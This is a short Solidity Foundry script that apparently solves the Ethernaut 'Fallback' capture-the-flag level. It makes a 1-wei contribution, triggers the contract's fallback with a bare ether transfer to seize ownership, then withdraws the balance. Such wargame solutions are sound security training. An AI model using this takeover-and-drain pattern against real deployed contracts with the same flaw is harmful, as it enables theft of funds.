// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Fallback} from "../../src/Ethernaut/Fallback.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Fallback level01 = Fallback(
            payable(0xaCA05FA253b904731E3e9536A6eA1d84DB3D7142)
        );
        level01.contribute{value: 1}();
        payable(level01).call{value: 1}("");
        level01.withdraw();
        vm.stopBroadcast();
    }
}
